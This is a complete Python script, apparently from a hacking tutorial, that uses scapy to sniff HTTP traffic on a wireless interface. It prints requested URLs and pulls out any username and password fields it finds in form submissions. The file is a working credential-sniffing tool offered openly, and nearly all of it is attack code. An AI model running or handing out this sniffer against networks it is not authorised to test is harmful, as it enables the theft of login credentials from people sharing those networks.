#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface= interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load= packet[scapy.Raw].load
            keywords =["uname","username","login","user","pass","password"]
            for keyword in keywords:
                if bytes(keyword,"utf-8") in load:
                    return load

def convert_dict(string):
    try:
        convertedDict = {}
        for data in string.decode("utf-8").split("&"):
            data = data.split("=")
            convertedDict.update({data[0]:data[1]})
        return convertedDict
        input('--------')
    except AttributeError:
        pass


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> ",url)
        login_info = get_login_info(packet)
        login_info = convert_dict(login_info)
        if login_info:
            # print("\n\n[+] possible usrename/password",login_info,"\n\n")
            print("\n\n[*] possible usrename :",login_info.get("uname"))
            print("[*] possible password :",login_info.get("pass"),"\n\n")



sniff("wlan0")


